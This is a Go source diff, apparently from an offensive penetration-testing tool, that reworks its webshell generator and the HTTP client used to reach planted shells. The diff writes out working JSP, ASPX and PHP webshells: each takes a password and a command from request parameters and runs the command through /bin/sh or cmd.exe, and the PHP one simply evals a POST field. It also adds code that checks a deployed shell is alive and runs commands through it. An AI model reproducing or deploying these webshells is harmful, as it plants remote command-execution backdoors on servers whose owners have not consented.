@@ -5,6 +5,7 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"mime/multipart"
@@ -76,6 +77,19 @@ type DeepResponse struct {
 	Elapsed    time.Duration
 	Truncated  bool
 	Error      string
+	// Err keeps the transport failure unwrapped. Callers display Error, but a
+	// caller that has to distinguish "my deadline passed" from "the target
+	// refused" needs errors.Is/errors.As, and those cannot read a string.
+	Err error
+}
+
+// transportErr is the transport failure as an error, with the same wording as
+// Error so message-matching callers keep working.
+func (r DeepResponse) transportErr() error {
+	if r.Err != nil {
+		return r.Err
+	}
+	return errors.New(r.Error)
 }
 
 // OK reports whether the request completed without a transport error.
@@ -135,7 +149,7 @@ func (c *DeepClient) Do(ctx context.Context, req DeepRequest) DeepResponse {
 	started := time.Now()
 	resp, err := c.client.Do(httpReq)
 	if err != nil {
-		return DeepResponse{Elapsed: time.Since(started), Error: err.Error()}
+		return DeepResponse{Elapsed: time.Since(started), Error: err.Error(), Err: err}
 	}
 	defer resp.Body.Close()
 	raw, truncated, readErr := readLimited(resp.Body, deepMaxBody)
@@ -148,6 +162,7 @@ func (c *DeepClient) Do(ctx context.Context, req DeepRequest) DeepResponse {
 	}
 	if readErr != nil {
 		out.Error = readErr.Error()
+		out.Err = readErr
 	}
 	out.Body = string(raw)
 	return out
@@ -530,48 +545,65 @@ func joinProbeURL(base, path string) string {
 
 // ---------------------------------------------------------------- Webshell
 
-// ShellPayload is a generated webshell.
+// ShellPayload is a generated webshell. Password and Key are never serialized:
+// a payload may be logged or returned by an API by accident, and the secret must
+// not travel with it.
 type ShellPayload struct {
-	Type     string `json:"type"`
-	Password string `json:"password"`
-	Filename string `json:"filename"`
-	Content  string `json:"-"`
-	Marker   string `json:"marker"`
+	Type       string `json:"type"`
+	Protocol   string `json:"protocol"`
+	Password   string `json:"-"`
+	Key        []byte `json:"-"`
+	Carrier    string `json:"carrier"`
+	KeyVersion int    `json:"key_version"`
+	Filename   string `json:"filename"`
+	Content    string `json:"-"`
+	Marker     string `json:"marker"`
+	SHA256     string `json:"sha256"`
+	// Build is the random build id baked into PHP/JSP payload sidecar names.
+	// It is never sent to clients; cleanup code uses it to remove temp files.
+	Build string `json:"-"`
 }
 
-// BuildShellPayload renders a webshell of the requested type. The PHP/JSP/ASPX
-// variants take the command from a request parameter and print its output.
-func BuildShellPayload(shellType, password string) ShellPayload {
+// BuildShellPayload renders a legacy (cleartext-parameter) webshell of the
+// requested type. Legacy shells put the password and command in the same
+// request; prefer BuildShellPayloadV2 for anything new. An empty password is
+// rejected instead of falling back to a well-known default.
+func BuildShellPayload(shellType, password string) (ShellPayload, error) {
 	shellType = strings.ToLower(strings.TrimSpace(shellType))
 	password = strings.TrimSpace(password)
 	if password == "" {
-		password = "jingwei"
+		return ShellPayload{}, fmt.Errorf("旧版 webshell 口令不能为空；请改用加密 v2 协议")
 	}
+	escJSP := strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(password)
+	escPHP := strings.NewReplacer(`\`, `\\`, `'`, `\'`).Replace(password)
 	switch shellType {
 	case "jsp":
-		return ShellPayload{
+		return finalizeShellPayload(ShellPayload{
 			Type:     "jsp",
+			Protocol: ShellProtocolLegacy,
 			Password: password,
 			Filename: "shell.jsp",
-			Content:  "<%@ page import=\"java.io.*\" %>\n<%\n  String pwd = request.getParameter(\"pwd\");\n  String cmd = request.getParameter(\"cmd\");\n  if (pwd != null && pwd.equals(\"" + password + "\") && cmd != null) {\n    Process pr = Runtime.getRuntime().exec(new String[]{ \"/bin/sh\", \"-c\", cmd });\n    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n    String l; while ((l = br.readLine()) != null) out.println(l);\n  } else { out.println(\"usage\"); }\n%>",
+			Content:  "<%@ page import=\"java.io.*\" %>\n<%\n  String pwd = request.getParameter(\"pwd\");\n  String cmd = request.getParameter(\"cmd\");\n  if (pwd != null && pwd.equals(\"" + escJSP + "\") && cmd != null) {\n    String os = System.getProperty(\"os.name\", \"\").toLowerCase();\n    Process pr = os.contains(\"win\") ? Runtime.getRuntime().exec(new String[]{ \"cmd.exe\", \"/c\", cmd }) : Runtime.getRuntime().exec(new String[]{ \"/bin/sh\", \"-c\", cmd });\n    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n    String l; while ((l = br.readLine()) != null) out.println(l);\n  } else { out.println(\"usage\"); }\n%>",
 			Marker:   "usage",
-		}
+		}), nil
 	case "aspx":
-		return ShellPayload{
+		return finalizeShellPayload(ShellPayload{
 			Type:     "aspx",
+			Protocol: ShellProtocolLegacy,
 			Password: password,
 			Filename: "shell.aspx",
-			Content:  "<%@ Page Language=\"C#\" %>\n<%\n  string pwd = Request.Form[\"pwd\"] ?? Request.QueryString[\"pwd\"];\n  string cmd = Request.Form[\"cmd\"] ?? Request.QueryString[\"cmd\"];\n  if (pwd == \"" + password + "\" && !string.IsNullOrEmpty(cmd)) {\n    System.Diagnostics.Process p = new System.Diagnostics.Process();\n    p.StartInfo.FileName = \"/bin/sh\"; p.StartInfo.Arguments = \"-c \" + cmd;\n    p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;\n    p.Start(); Response.Write(p.StandardOutput.ReadToEnd());\n  } else { Response.Write(\"usage\"); }\n%>",
+			Content:  "<%@ Page Language=\"C#\" %>\n<%\n  string pwd = Request.Form[\"pwd\"] ?? Request.QueryString[\"pwd\"];\n  string cmd = Request.Form[\"cmd\"] ?? Request.QueryString[\"cmd\"];\n  if (pwd == \"" + escJSP + "\" && !string.IsNullOrEmpty(cmd)) {\n    System.Diagnostics.Process p = new System.Diagnostics.Process();\n    bool win = Environment.OSVersion.Platform == System.PlatformID.Win32NT;\n    p.StartInfo.FileName = win ? \"cmd.exe\" : \"/bin/sh\";\n    p.StartInfo.Arguments = win ? (\"/c \" + cmd) : (\"-c \\\"\" + cmd.Replace(\"\\\"\", \"\\\\\\\"\") + \"\\\"\");\n    p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true;\n    p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); Response.Write(p.StandardError.ReadToEnd());\n  } else { Response.Write(\"usage\"); }\n%>",
 			Marker:   "usage",
-		}
+		}), nil
 	default:
-		return ShellPayload{
+		return finalizeShellPayload(ShellPayload{
 			Type:     "php",
+			Protocol: ShellProtocolLegacy,
 			Password: password,
 			Filename: "shell.php",
-			Content:  "<?php @eval($_POST['" + password + "']); ?>",
+			Content:  "<?php @eval($_POST['" + escPHP + "']); ?>",
 			Marker:   "usage",
-		}
+		}), nil
 	}
 }
 
@@ -701,6 +733,9 @@ func bodyString(r io.Reader) string {
 
 // CheckShellAlive reports whether a deployed webshell answers commands.
 func CheckShellAlive(ctx context.Context, c *DeepClient, shellURL string, payload ShellPayload) (bool, string) {
+	if payload.Protocol == ShellProtocolV2 {
+		return checkShellAliveV2(ctx, c, shellURL, payload)
+	}
 	marker := "jw_alive_" + strconv.FormatInt(time.Now().UnixNano(), 36)
 	resp := c.Do(ctx, payload.ShellRequest(shellURL, WrapShellCommand(payload.Type, "echo "+marker)))
 	if resp.Error != "" {
@@ -723,9 +758,12 @@ func RunShellCommand(ctx context.Context, c *DeepClient, shellURL string, payloa
 	if strings.TrimSpace(command) == "" {
 		return "", fmt.Errorf("命令不能为空")
 	}
+	if payload.Protocol == ShellProtocolV2 {
+		return runShellCommandV2(ctx, c, shellURL, payload, command)
+	}
 	resp := c.Do(ctx, payload.ShellRequest(shellURL, WrapShellCommand(payload.Type, command)))
 	if resp.Error != "" {
-		return "", fmt.Errorf("%s", resp.Error)
+		return "", resp.transportErr()
 	}
 	if resp.StatusCode >= 400 {
 		return resp.Body, fmt.Errorf("shell 返回 HTTP %d", resp.StatusCode)
